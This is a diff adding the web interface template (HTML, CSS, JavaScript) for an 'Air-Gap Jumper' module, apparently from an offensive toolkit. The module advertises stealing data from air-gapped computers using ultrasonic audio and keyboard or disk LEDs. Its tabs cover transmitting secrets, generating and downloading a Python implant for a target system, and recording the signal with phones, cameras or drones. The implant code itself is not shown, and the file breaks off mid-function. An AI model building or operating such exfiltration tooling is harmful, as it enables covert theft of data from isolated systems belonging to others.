@@ -1,0 +1,1072 @@
+{% extends "base.html" %}
+{% block title %}Air-Gap Jumper - Fiziksel İzolasyonu Aşmak{% endblock %}
+
+{% block extra_css %}
+<style>
+    /* Button Styles */
+    .btn {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        padding: 12px 20px;
+        font-size: 14px;
+        font-weight: 600;
+        border-radius: 8px;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        border: 2px solid transparent;
+        text-decoration: none;
+    }
+    
+    .btn-success {
+        background: linear-gradient(135deg, #00ff88, #00cc6a) !important;
+        color: #000 !important;
+        border-color: #00ff88 !important;
+    }
+    
+    .btn-success:hover {
+        background: linear-gradient(135deg, #00cc6a, #009950) !important;
+        box-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
+        transform: translateY(-2px);
+    }
+    
+    .btn-danger {
+        background: linear-gradient(135deg, #ff4444, #cc0000) !important;
+        color: #fff !important;
+        border-color: #ff4444 !important;
+    }
+    
+    .btn-danger:hover {
+        background: linear-gradient(135deg, #cc0000, #990000) !important;
+        box-shadow: 0 0 20px rgba(255, 68, 68, 0.5);
+        transform: translateY(-2px);
+    }
+    
+    .btn-warning {
+        background: linear-gradient(135deg, #ffaa00, #ff8800) !important;
+        color: #000 !important;
+        border-color: #ffaa00 !important;
+    }
+    
+    .btn-warning:hover {
+        background: linear-gradient(135deg, #ff8800, #cc6600) !important;
+        box-shadow: 0 0 20px rgba(255, 170, 0, 0.5);
+        transform: translateY(-2px);
+    }
+    
+    .btn-info {
+        background: linear-gradient(135deg, #00bfff, #0099cc) !important;
+        color: #fff !important;
+        border-color: #00bfff !important;
+    }
+    
+    .btn-info:hover {
+        background: linear-gradient(135deg, #0099cc, #007799) !important;
+        box-shadow: 0 0 20px rgba(0, 191, 255, 0.5);
+        transform: translateY(-2px);
+    }
+    
+    .btn-primary {
+        background: linear-gradient(135deg, #9b59b6, #8e44ad) !important;
+        color: #fff !important;
+        border-color: #9b59b6 !important;
+    }
+    
+    .btn-primary:hover {
+        background: linear-gradient(135deg, #8e44ad, #7d3c98) !important;
+        box-shadow: 0 0 20px rgba(155, 89, 182, 0.5);
+        transform: translateY(-2px);
+    }
+    
+    .btn-outline-success {
+        background: transparent !important;
+        color: #00ff88 !important;
+        border: 2px solid #00ff88 !important;
+    }
+    
+    .btn-outline-success:hover {
+        background: rgba(0, 255, 136, 0.2) !important;
+        box-shadow: 0 0 15px rgba(0, 255, 136, 0.3);
+    }
+    
+    .btn-outline-info {
+        background: transparent !important;
+        color: #00bfff !important;
+        border: 2px solid #00bfff !important;
+    }
+    
+    .btn-outline-info:hover {
+        background: rgba(0, 191, 255, 0.2) !important;
+        box-shadow: 0 0 15px rgba(0, 191, 255, 0.3);
+    }
+    
+    .btn-outline-secondary {
+        background: transparent !important;
+        color: #888 !important;
+        border: 2px solid #555 !important;
+    }
+    
+    .btn-outline-secondary:hover {
+        background: rgba(136, 136, 136, 0.2) !important;
+        color: #fff !important;
+    }
+    
+    .btn-sm {
+        padding: 6px 12px;
+        font-size: 12px;
+    }
+    
+    .btn-lg {
+        padding: 15px 30px;
+        font-size: 16px;
+    }
+    
+    /* Card Styles */
+    .card {
+        background: linear-gradient(145deg, #1a1a2e, #16213e);
+        border: 1px solid #333;
+        border-radius: 12px;
+        overflow: hidden;
+    }
+    
+    .card-header {
+        background: rgba(0, 0, 0, 0.3);
+        border-bottom: 1px solid #333;
+        padding: 15px 20px;
+        color: #00ff88;
+        font-weight: 600;
+    }
+    
+    .card-body {
+        padding: 20px;
+    }
+    
+    .bg-dark {
+        background: transparent !important;
+    }
+    
+    /* Form Styles */
+    .form-control, .form-select {
+        background-color: #1a1a2e !important;
+        border: 2px solid #00ff88 !important;
+        color: #fff !important;
+        padding: 12px 15px;
+        border-radius: 8px;
+        font-size: 14px;
+    }
+    
+    .form-control:focus, .form-select:focus {
+        border-color: #00ffaa !important;
+        box-shadow: 0 0 15px rgba(0, 255, 136, 0.3) !important;
+        outline: none;
+    }
+    
+    .form-control::placeholder {
+        color: #666 !important;
+    }
+    
+    .form-label {
+        color: #888;
+        font-size: 14px;
+        margin-bottom: 8px;
+        display: block;
+    }
+    
+    /* Air-Gap Specific Styles */
+    .airgap-hero {
+        background: linear-gradient(135deg, #1a0a2e 0%, #16213e 50%, #0a1628 100%);
+        border-radius: 15px;
+        padding: 40px;
+        position: relative;
+        overflow: hidden;
+        margin-bottom: 30px;
+    }
+    
+    .airgap-hero::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: url("data:image/svg+xml,%3Csvg width='100' height='100' viewBox='0 0 100 100' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M50 50 L50 0 M50 50 L100 50 M50 50 L50 100 M50 50 L0 50' stroke='%239b59b6' stroke-opacity='0.1' stroke-width='1'/%3E%3Ccircle cx='50' cy='50' r='30' fill='none' stroke='%239b59b6' stroke-opacity='0.1'/%3E%3C/svg%3E");
+        pointer-events: none;
+    }
+    
+    .method-card {
+        background: linear-gradient(145deg, #1a1a2e, #16213e);
+        border: 2px solid #333;
+        border-radius: 15px;
+        padding: 25px;
+        text-align: center;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        height: 100%;
+    }
+    
+    .method-card:hover {
+        border-color: #9b59b6;
+        box-shadow: 0 0 30px rgba(155, 89, 182, 0.3);
+        transform: translateY(-5px);
+    }
+    
+    .method-card.active {
+        border-color: #00ff88;
+        box-shadow: 0 0 30px rgba(0, 255, 136, 0.3);
+    }
+    
+    .method-icon {
+        font-size: 4rem;
+        margin-bottom: 15px;
+        filter: drop-shadow(0 0 20px rgba(155, 89, 182, 0.5));
+    }
+    
+    .method-name {
+        font-size: 1.2rem;
+        font-weight: bold;
+        color: #fff;
+        margin-bottom: 10px;
+    }
+    
+    .method-desc {
+        color: #888;
+        font-size: 0.9rem;
+        margin-bottom: 15px;
+    }
+    
+    .method-stats {
+        display: flex;
+        justify-content: space-around;
+        flex-wrap: wrap;
+        gap: 10px;
+    }
+    
+    .stat-item {
+        text-align: center;
+    }
+    
+    .stat-label {
+        font-size: 0.7rem;
+        color: #666;
+        text-transform: uppercase;
+    }
+    
+    .stat-value {
+        font-size: 0.85rem;
+        color: #00ff88;
+        font-weight: bold;
+    }
+    
+    /* LED Simulator */
+    .led-simulator {
+        width: 80px;
+        height: 80px;
+        border-radius: 50%;
+        background: #333;
+        margin: 0 auto 20px;
+        transition: all 0.05s;
+        box-shadow: inset 0 0 20px rgba(0, 0, 0, 0.5);
+    }
+    
+    .led-simulator.on {
+        background: #00ff00;
+        box-shadow: 0 0 50px #00ff00, 0 0 100px #00ff00;
+    }
+    
+    /* Waveform Display */
+    .waveform-display {
+        background: #0a0a0a;
+        border: 1px solid #333;
+        border-radius: 10px;
+        padding: 20px;
+        height: 150px;
+        position: relative;
+        overflow: hidden;
+    }
+    
+    .waveform-canvas {
+        width: 100%;
+        height: 100%;
+    }
+    
+    /* Frequency Slider */
+    .frequency-slider {
+        -webkit-appearance: none;
+        width: 100%;
+        height: 10px;
+        border-radius: 5px;
+        background: linear-gradient(to right, #00ff88, #9b59b6, #ff4444);
+        outline: none;
+    }
+    
+    .frequency-slider::-webkit-slider-thumb {
+        -webkit-appearance: none;
+        width: 25px;
+        height: 25px;
+        border-radius: 50%;
+        background: #fff;
+        cursor: pointer;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+    }
+    
+    .frequency-display {
+        font-size: 3rem;
+        font-weight: bold;
+        text-align: center;
+        color: #9b59b6;
+        text-shadow: 0 0 20px #9b59b6;
+        font-family: 'Courier New', monospace;
+    }
+    
+    /* Code Display */
+    .code-display {
+        background: #0a0a0a;
+        border: 1px solid #333;
+        border-radius: 8px;
+        padding: 15px;
+        font-family: 'Courier New', monospace;
+        font-size: 0.85rem;
+        color: #00ff88;
+        max-height: 300px;
+        overflow-y: auto;
+        white-space: pre-wrap;
+    }
+    
+    /* Terminal Output */
+    .terminal-output {
+        background: #0a0a0a;
+        border: 1px solid #333;
+        border-radius: 8px;
+        padding: 15px;
+        font-family: 'Courier New', monospace;
+        font-size: 0.85rem;
+        color: #00ff88;
+        max-height: 200px;
+        overflow-y: auto;
+    }
+    
+    /* Morse Display */
+    .morse-display {
+        font-family: 'Courier New', monospace;
+        font-size: 1.5rem;
+        letter-spacing: 5px;
+        color: #ffaa00;
+        text-align: center;
+        padding: 20px;
+        background: rgba(0, 0, 0, 0.3);
+        border-radius: 8px;
+    }
+    
+    /* Tab Styles */
+    .nav-tabs {
+        border-bottom: 2px solid #333;
+    }
+    
+    .nav-tabs .nav-link {
+        background: transparent;
+        border: none;
+        color: #888;
+        padding: 15px 25px;
+        font-weight: 600;
+        transition: all 0.3s;
+    }
+    
+    .nav-tabs .nav-link:hover {
+        color: #fff;
+    }
+    
+    .nav-tabs .nav-link.active {
+        background: transparent;
+        color: #9b59b6;
+        border-bottom: 3px solid #9b59b6;
+    }
+    
+    /* Animation */
+    @keyframes pulse-glow {
+        0%, 100% { box-shadow: 0 0 20px rgba(155, 89, 182, 0.3); }
+        50% { box-shadow: 0 0 40px rgba(155, 89, 182, 0.6); }
+    }
+    
+    .transmitting {
+        animation: pulse-glow 0.5s infinite;
+    }
+    
+    /* Badge */
+    .badge {
+        padding: 5px 10px;
+        border-radius: 5px;
+        font-size: 0.75rem;
+        font-weight: 600;
+    }
+    
+    .bg-success { background: rgba(0, 255, 136, 0.2) !important; color: #00ff88 !important; }
+    .bg-warning { background: rgba(255, 170, 0, 0.2) !important; color: #ffaa00 !important; }
+    .bg-danger { background: rgba(255, 68, 68, 0.2) !important; color: #ff4444 !important; }
+    .bg-info { background: rgba(0, 191, 255, 0.2) !important; color: #00bfff !important; }
+    .bg-primary { background: rgba(155, 89, 182, 0.2) !important; color: #9b59b6 !important; }
+</style>
+{% endblock %}
+
+{% block content %}
+<div class="container-fluid">
+    <!-- Hero Section -->
+    <div class="airgap-hero">
+        <div class="row align-items-center">
+            <div class="col-md-8">
+                <h1 class="text-white mb-3">
+                    <span style="font-size: 3rem;">🔌</span>
+                    Air-Gap Jumper
+                </h1>
+                <p class="text-secondary mb-0" style="font-size: 1.1rem;">
+                    Fiziksel olarak izole edilmiş sistemlerden veri çalma teknikleri.
+                    İnternete bağlı olmayan bilgisayarlardan ses ve ışık ile veri kaçırma.
+                </p>
+            </div>
+            <div class="col-md-4 text-end">
+                <span class="badge bg-danger me-2">⚡ COVERT</span>
+                <span class="badge bg-warning">🔇 SILENT</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Method Selection -->
+    <div class="row mb-4">
+        {% for key, method in methods.items() %}
+        <div class="col-md-4 col-lg-2 mb-3">
+            <div class="method-card" onclick="selectMethod('{{ key }}')" id="method-{{ key }}">
+                <div class="method-icon">{{ method.icon }}</div>
+                <div class="method-name">{{ method.name.split()[0] }}</div>
+                <div class="method-desc">{{ method.description[:40] }}...</div>
+                <div class="method-stats">
+                    <div class="stat-item">
+                        <div class="stat-label">Hız</div>
+                        <div class="stat-value">{{ method.speed }}</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-label">Risk</div>
+                        <div class="stat-value">{{ method.detection_risk }}</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        {% endfor %}
+    </div>
+
+    <!-- Main Content Tabs -->
+    <ul class="nav nav-tabs mb-4" id="mainTabs">
+        <li class="nav-item">
+            <a class="nav-link active" data-bs-toggle="tab" href="#ultrasonic-tab">
+                <i class="fas fa-volume-up me-2"></i>Ultrasonic Exfil
+            </a>
+        </li>
+        <li class="nav-item">
+            <a class="nav-link" data-bs-toggle="tab" href="#led-tab">
+                <i class="fas fa-lightbulb me-2"></i>LED Exfil
+            </a>
+        </li>
+        <li class="nav-item">
+            <a class="nav-link" data-bs-toggle="tab" href="#implant-tab">
+                <i class="fas fa-bug me-2"></i>Implant Generator
+            </a>
+        </li>
+        <li class="nav-item">
+            <a class="nav-link" data-bs-toggle="tab" href="#receiver-tab">
+                <i class="fas fa-satellite-dish me-2"></i>Receiver
+            </a>
+        </li>
+    </ul>
+
+    <div class="tab-content">
+        <!-- Ultrasonic Tab -->
+        <div class="tab-pane fade show active" id="ultrasonic-tab">
+            <div class="row">
+                <div class="col-lg-6">
+                    <div class="card bg-dark mb-4">
+                        <div class="card-header">
+                            <i class="fas fa-cog me-2"></i>Ultrasonic Configuration
+                        </div>
+                        <div class="card-body">
+                            <div class="mb-4">
+                                <label class="form-label">Carrier Frequency</label>
+                                <input type="range" class="frequency-slider" id="ultrasonic-freq" 
+                                       min="18000" max="22000" value="19000" 
+                                       oninput="updateFrequencyDisplay(this.value)">
+                                <div class="frequency-display mt-2" id="freq-display">19.00 kHz</div>
+                                <div class="text-center text-muted small">
+                                    <span class="text-success">18kHz</span> — İnsan kulağı sınırı — 
+                                    <span class="text-danger">22kHz</span>
+                                </div>
+                            </div>
+                            
+                            <div class="mb-3">
+                                <label class="form-label">Data to Exfiltrate</label>
+                                <textarea class="form-control" id="ultrasonic-data" rows="3" 
+                                          placeholder="Enter secret data...">PASSWORD_123_SECRET</textarea>
+                            </div>
+                            
+                            <div class="form-check mb-3">
+                                <input class="form-check-input" type="checkbox" id="ultrasonic-encrypt" checked>
+                                <label class="form-check-label text-secondary">
+                                    <i class="fas fa-lock me-1"></i> Encrypt data (XOR)
+                                </label>
+                            </div>
+                            
+                            <div class="d-grid gap-2">
+                                <button class="btn btn-primary" onclick="prepareUltrasonic()">
+                                    <i class="fas fa-cog me-1"></i> Prepare Transmission
+                                </button>
+                                <button class="btn btn-success" onclick="transmitUltrasonic()" id="btn-transmit">
+                                    <i class="fas fa-broadcast-tower me-1"></i> TRANSMIT NOW
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="col-lg-6">
+                    <div class="card bg-dark mb-4">
+                        <div class="card-header">
+                            <i class="fas fa-wave-square me-2"></i>Waveform Preview
+                        </div>
+                        <div class="card-body">
+                            <div class="waveform-display" id="waveform-container">
+                                <canvas id="waveform-canvas" class="waveform-canvas"></canvas>
+                            </div>
+                            <div class="mt-3 text-center">
+                                <span class="badge bg-info me-2" id="ultrasonic-status">Ready</span>
+                                <span class="badge bg-primary" id="ultrasonic-duration">Duration: --</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="card bg-dark">
+                        <div class="card-header">
+                            <i class="fas fa-info-circle me-2"></i>How It Works
+                        </div>
+                        <div class="card-body">
+                            <ol class="text-secondary small mb-0">
+                                <li class="mb-2">Veri, FSK (Frequency Shift Keying) ile modüle edilir</li>
+                                <li class="mb-2">18-22 kHz arası sesler hoparlörden çıkar (insan duyamaz)</li>
+                                <li class="mb-2">Yakındaki telefon/mikrofon bu sesi kaydeder</li>
+                                <li class="mb-2">Monolith receiver uygulaması sesi decode eder</li>
+                                <li>Veri ağ bağlantısı olmadan aktarılmış olur! 🎯</li>
+                            </ol>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- LED Tab -->
+        <div class="tab-pane fade" id="led-tab">
+            <div class="row">
+                <div class="col-lg-6">
+                    <div class="card bg-dark mb-4">
+                        <div class="card-header">
+                            <i class="fas fa-lightbulb me-2"></i>LED Configuration
+                        </div>
+                        <div class="card-body">
+                            <div class="mb-3">
+                                <label class="form-label">LED Type</label>
+                                <select class="form-select" id="led-type">
+                                    <option value="caps_lock">💡 Caps Lock LED</option>
+                                    <option value="num_lock">💡 Num Lock LED</option>
+                                    <option value="scroll_lock">💡 Scroll Lock LED</option>
+                                    <option value="hdd_led">💾 HDD Activity LED</option>
+                                    <option value="power_led">🔌 Power LED</option>
+                                </select>
+                            </div>
+                            
+                            <div class="mb-3">
+                                <label class="form-label">Encoding Mode</label>
+                                <div class="btn-group w-100">
+                                    <input type="radio" class="btn-check" name="led-mode" id="mode-binary" checked>
+                                    <label class="btn btn-outline-info" for="mode-binary">Binary</label>
+                                    
+                                    <input type="radio" class="btn-check" name="led-mode" id="mode-morse">
+                                    <label class="btn btn-outline-info" for="mode-morse">Morse Code</label>
+                                </div>
+                            </div>
+                            
+                            <div class="mb-3">
+                                <label class="form-label">Data to Exfiltrate</label>
+                                <textarea class="form-control" id="led-data" rows="3" 
+                                          placeholder="Enter secret data...">SOS</textarea>
+                            </div>
+                            
+                            <div class="d-grid gap-2">
+                                <button class="btn btn-warning" onclick="prepareLED()">
+                                    <i class="fas fa-cog me-1"></i> Prepare Pattern
+                                </button>
+                                <button class="btn btn-success" onclick="simulateLED()">
+                                    <i class="fas fa-play me-1"></i> Simulate LED
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="col-lg-6">
+                    <div class="card bg-dark mb-4">
+                        <div class="card-header">
+                            <i class="fas fa-circle me-2"></i>LED Simulator
+                        </div>
+                        <div class="card-body text-center">
+                            <div class="led-simulator" id="led-sim"></div>
+                            <div class="morse-display" id="morse-display">
+                                --- .- .- -.
+                            </div>
+                            <div class="mt-3">
+                                <span class="badge bg-info" id="led-status">Ready</span>
+                                <span class="badge bg-primary" id="led-duration">Duration: --</span>
+                                <span class="badge bg-success" id="led-bitrate">Bit Rate: --</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="card bg-dark">
+                        <div class="card-header">
+                            <i class="fas fa-camera me-2"></i>Receiver Setup
+                        </div>
+                        <div class="card-body">
+                            <p class="text-secondary small">
+                                LED sinyalini almak için kamera veya drone kullanılır:
+                            </p>
+                            <ul class="text-secondary small">
+                                <li>📱 Telefon kamerası (60+ FPS önerilir)</li>
+                                <li>📷 IP kamera ile uzaktan izleme</li>
+                                <li>🚁 Drone ile pencereden kayıt</li>
+                            </ul>
+                            <button class="btn btn-outline-info btn-sm w-100" onclick="downloadReceiverCode('led')">
+                                <i class="fas fa-download me-1"></i> Download Receiver Script
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Implant Generator Tab -->
+        <div class="tab-pane fade" id="implant-tab">
+            <div class="row">
+                <div class="col-lg-4">
+                    <div class="card bg-dark">
+                        <div class="card-header">
+                            <i class="fas fa-bug me-2"></i>Implant Options
+                        </div>
+                        <div class="card-body">
+                            <p class="text-secondary small">
+                                Hedef sisteme yerleştirilecek implant kodunu oluşturun:
+                            </p>
+                            
+                            <div class="mb-3">
+                                <label class="form-label">Exfiltration Methods</label>
+                                <div class="form-check">
+                                    <input class="form-check-input" type="checkbox" id="impl-ultrasonic" checked>
+                                    <label class="form-check-label text-secondary">🔊 Ultrasonic</label>
+                                </div>
+                                <div class="form-check">
+                                    <input class="form-check-input" type="checkbox" id="impl-led-binary" checked>
+                                    <label class="form-check-label text-secondary">💡 LED Binary</label>
+                                </div>
+                                <div class="form-check">
+                                    <input class="form-check-input" type="checkbox" id="impl-led-morse">
+                                    <label class="form-check-label text-secondary">📡 LED Morse</label>
+                                </div>
+                            </div>
+                            
+                            <div class="d-grid gap-2">
+                                <button class="btn btn-danger" onclick="generateImplant()">
+                                    <i class="fas fa-code me-1"></i> Generate Implant
+                                </button>
+                                <button class="btn btn-outline-success" onclick="downloadImplant()">
+                                    <i class="fas fa-download me-1"></i> Download .py
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="col-lg-8">
+                    <div class="card bg-dark">
+                        <div class="card-header d-flex justify-content-between align-items-center">
+                            <span><i class="fas fa-file-code me-2"></i>Generated Implant Code</span>
+                            <button class="btn btn-sm btn-outline-secondary" onclick="copyImplantCode()">
+                                <i class="fas fa-copy"></i>
+                            </button>
+                        </div>
+                        <div class="card-body p-0">
+                            <pre class="code-display" id="implant-code" style="margin: 0; max-height: 500px;">
+#!/usr/bin/env python3
+# Air-Gap Exfiltration Implant
+# Click "Generate Implant" to create code
+</pre>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Receiver Tab -->
+        <div class="tab-pane fade" id="receiver-tab">
+            <div class="row">
+                <div class="col-lg-6">
+                    <div class="card bg-dark mb-4">
+                        <div class="card-header">
+                            <i class="fas fa-microphone me-2"></i>Ultrasonic Receiver
+                        </div>
+                        <div class="card-body">
+                            <p class="text-secondary">
+                                Telefon veya mikrofon ile ultrasonik sinyalleri dinleyin:
+                            </p>
+                            
+                            <div class="d-grid gap-2 mb-3">
+                                <button class="btn btn-info" onclick="startListening()">
+                                    <i class="fas fa-microphone me-1"></i> Start Listening
+                                </button>
+                                <button class="btn btn-outline-danger" onclick="stopListening()">
+                                    <i class="fas fa-stop me-1"></i> Stop
+                                </button>
+                            </div>
+                            
+                            <div class="terminal-output" id="receiver-output">
+                                <div class="text-secondary">[*] Receiver ready</div>
+                                <div class="text-secondary">[*] Click "Start Listening" to begin</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="col-lg-6">
+                    <div class="card bg-dark mb-4">
+                        <div class="card-header">
+                            <i class="fas fa-code me-2"></i>Mobile Receiver Code
+                        </div>
+                        <div class="card-body">
+                            <p class="text-secondary small">
+                                Bu JavaScript kodunu Monolith mobil uygulamasına veya 
+                                herhangi bir web sayfasına ekleyerek alıcı oluşturabilirsiniz:
+                            </p>
+                            
+                            <pre class="code-display" id="receiver-code" style="max-height: 250px;">
+// Ultrasonic Receiver
+// Paste in browser console or mobile app
+
+const receiver = {
+    audioContext: null,
+    async start() {
+        this.audioContext = new AudioContext();
+        const stream = await navigator.mediaDevices
+            .getUserMedia({ audio: true });
+        // ... full code available on download
+    }
+};
+</pre>
+                            
+                            <div class="d-grid gap-2 mt-3">
+                                <button class="btn btn-outline-info" onclick="downloadReceiverCode('ultrasonic')">
+                                    <i class="fas fa-download me-1"></i> Download Full Code
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Terminal -->
+    <div class="row mt-4">
+        <div class="col-12">
+            <div class="card bg-dark">
+                <div class="card-header d-flex justify-content-between align-items-center">
+                    <span><i class="fas fa-terminal me-2"></i>Activity Log</span>
+                    <button class="btn btn-sm btn-outline-secondary" onclick="clearLog()">
+                        <i class="fas fa-trash"></i>
+                    </button>
+                </div>
+                <div class="card-body p-0">
+                    <div class="terminal-output" id="activity-log">
+                        <div class="text-success">[+] Air-Gap Jumper initialized</div>
+                        <div class="text-warning">[!] WARNING: Use only for authorized penetration testing</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Hidden audio element for playback -->
+<audio id="ultrasonic-audio" style="display: none;"></audio>
+{% endblock %}
+
+{% block extra_js %}
+<script>
+let audioContext = null;
+let isTransmitting = false;
+let ledSimulationInterval = null;
+
+function log(message, type = 'info') {
+    const logDiv = document.getElementById('activity-log');
+    const timestamp = new Date().toLocaleTimeString();
+    let color = 'text-secondary';
+    let prefix = '[*]';
+    
+    if (type === 'success') { color = 'text-success'; prefix = '[+]'; }
+    else if (type === 'error') { color = 'text-danger'; prefix = '[-]'; }
+    else if (type === 'warning') { color = 'text-warning'; prefix = '[!]'; }
+    else if (type === 'transmit') { color = 'text-purple'; prefix = '[TX]'; }
+    
+    logDiv.innerHTML += `<div class="${color}">${prefix} [${timestamp}] ${message}</div>`;
+    logDiv.scrollTop = logDiv.scrollHeight;
+}
+
+function clearLog() {
+    document.getElementById('activity-log').innerHTML = '<div class="text-success">[+] Log cleared</div>';
+}
+
+function selectMethod(method) {
+    document.querySelectorAll('.method-card').forEach(card => card.classList.remove('active'));
+    document.getElementById(`method-${method}`).classList.add('active');
+    log(`Selected method: ${method}`, 'info');
+}
+
+function updateFrequencyDisplay(value) {
+    const freq = (value / 1000).toFixed(2);
+    document.getElementById('freq-display').textContent = `${freq} kHz`;
+}
+
+// Waveform visualization
+function drawWaveform(frequency) {
+    const canvas = document.getElementById('waveform-canvas');
+    const ctx = canvas.getContext('2d');
+    const width = canvas.width = canvas.offsetWidth;
+    const height = canvas.height = canvas.offsetHeight;
+    
+    ctx.clearRect(0, 0, width, height);
+    ctx.strokeStyle = '#9b59b6';
+    ctx.lineWidth = 2;
+    ctx.beginPath();
+    
+    const cycles = 10;
+    for (let x = 0; x < width; x++) {
+        const y = height / 2 + Math.sin((x / width) * cycles * Math.PI * 2) * (height / 3);
+        if (x === 0) ctx.moveTo(x, y);
+        else ctx.lineTo(x, y);
+    }
+    ctx.stroke();
+}
+
+async function prepareUltrasonic() {
+    const data = document.getElementById('ultrasonic-data').value;
+    const frequency = document.getElementById('ultrasonic-freq').value;
+    const encrypt = document.getElementById('ultrasonic-encrypt').checked;
+    
+    log(`Preparing ultrasonic transmission at ${frequency}Hz...`, 'info');
+    
+    try {
+        const response = await fetch('/airgap/api/ultrasonic/prepare', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ data, frequency: parseInt(frequency), encrypt })
+        });
+        const result = await response.json();
+        
+        if (result.success) {
+            document.getElementById('ultrasonic-status').textContent = 'Prepared';
+            document.getElementById('ultrasonic-duration').textContent = `Duration: ${result.duration.toFixed(2)}s`;
+            drawWaveform(frequency);
+            log(`Transmission prepared: ${result.data_size} bytes, checksum: ${result.checksum}`, 'success');
+        }
+    } catch (error) {
+        log(`Error: ${error.message}`, 'error');
+    }
+}
+
+async function transmitUltrasonic() {
+    const data = document.getElementById('ultrasonic-data').value;
+    const frequency = document.getElementById('ultrasonic-freq').value;
+    
+    log(`🔊 TRANSMITTING at ${frequency}Hz...`, 'transmit');
+    document.getElementById('btn-transmit').classList.add('transmitting');
+    
+    try {
+        const response = await fetch('/airgap/api/ultrasonic/transmit', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ data, frequency: parseInt(frequency) })
+        });
+        const result = await response.json();
+        
+        if (result.success && result.wav_base64) {
+            // Play the audio
+            const audio = document.getElementById('ultrasonic-audio');
+            audio.src = 'data:audio/wav;base64,' + result.wav_base64;
+            audio.play();
+            
+            document.getElementById('ultrasonic-status').textContent = 'Transmitting...';
+            log(`Transmission started, duration: ${result.duration.toFixed(2)}s`, 'success');
+            
+            setTimeout(() => {
+                document.getElementById('btn-transmit').classList.remove('transmitting');
+                document.getElementById('ultrasonic-status').textContent = 'Complete';
+                log('Transmission complete', 'success');
+            }, result.duration * 1000);
+        }
+    } catch (error) {
+        log(`Transmission error: ${error.message}`, 'error');
+        document.getElementById('btn-transmit').classList.remove('transmitting');
+    }
+}
+
+async function prepareLED() {
+    const data = document.getElementById('led-data').value;
+    const ledType = document.getElementById('led-type').value;
+    const useMorse = document.getElementById('mode-morse').checked;
+    
+    log(`Preparing LED pattern (${useMorse ? 'Morse' : 'Binary'})...`, 'info');
+    
+    try {
+        const response = await fetch('/airgap/api/led/prepare', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ data, led_type: ledType, use_morse: useMorse })
+        });
+        const result = await response.json();
+        
+        if (result.success) {
+            document.getElementById('led-status').textContent = 'Prepared';
+            document.getElementById('led-duration').textContent = `Duration: ${result.total_duration.toFixed(2)}s`;
+            if (result.bit_rate) {
+                document.getElementById('led-bitrate').textContent = `Bit Rate: ${result.bit_rate.toFixed(1)} bps`;
+            }
+            if (result.morse_code) {
+                document.getElementById('morse-display').textContent = result.morse_code;
+            }
+            log(`LED pattern prepared: ${result.total_duration.toFixed(2)}s duration`, 'success');
+            
+            // Store pattern for simulation
+            window.ledPattern = result.pattern;
+        }
+    } catch (error) {
+        log(`Error: ${error.message}`, 'error');
+    }
+}
+
+async function simulateLED() {
+    const data = document.getElementById('led-data').value;
+    const useMorse = document.getElementById('mode-morse').checked;
+    
+    log(`💡 Simulating LED transmission...`, 'transmit');
+    
+    try {
+        const response = await fetch('/airgap/api/led/simulate', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ data, use_morse: useMorse })
+        });
+        const result = await response.json();
+        
+        if (result.success) {
+            const led = document.getElementById('led-sim');
+            const pattern = result.pattern;
+            let index = 0;
+            
+            document.getElementById('led-status').textContent = 'Transmitting...';
+            
+            function playPattern() {
+                if (index >= pattern.length) {
+                    led.classList.remove('on');
+                    document.getElementById('led-status').textContent = 'Complete';
+                    log('LED simulation complete', 'success');
+                    return;
+                }
+                
+                const [state, duration] = pattern[index];
+                if (state) led.classList.add('on');
+                else led.classList.remove('on');
+                
+                index++;
+                setTimeout(playPattern, duration * 1000);
+            }
+            
+            playPattern();
+        }
+    } catch (error) {
+        log(`Error: ${error.message}`, 'error');
+    }
+}
+
+async function generateImplant() {
+    const methods = [];
+    if (document.getElementById('impl-ultrasonic').checked) methods.push('ultrasonic');
+    if (document.getElementById('impl-led-binary').checked) methods.push('led_binary');
+    if (document.getElementById('impl-led-morse').checked) methods.push('led_morse');
+    
+    log(`Generating implant with methods: ${methods.join(', ')}...`, 'info');
+    
+    try {
+        const response = await fetch('/airgap/api/implant/generate', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ methods })
+        });
+        const result = await response.json();
+        
+        if (result.success) {
+            document.getElementById('implant-code').textContent = result.implant_code;
+            log(`Implant generated with ${methods.length} exfiltration methods`, 'success');
+        }
+    } catch (error) {
+        log(`Error: ${error.message}`, 'error');
+    }
+}
+
+function downloadImplant() {
+    const methods = [];
+    if (document.getElementById('impl-ultrasonic').checked) methods.push('ultrasonic');
+    if (document.getElementById('impl-led-binary').checked) methods.push('led_binary');
+    if (document.getElementById('impl-led-morse').checked) methods.push('led_morse');
+    
+    window.location.href = `/airgap/api/download/implant?methods=${methods.join(',')}`;
+    log('Downloading implant...', 'info');
+}
+
+function downloadReceiverCode(method) {
+    window.location.href = `/airgap/api/download/receiver?method=${method}`;
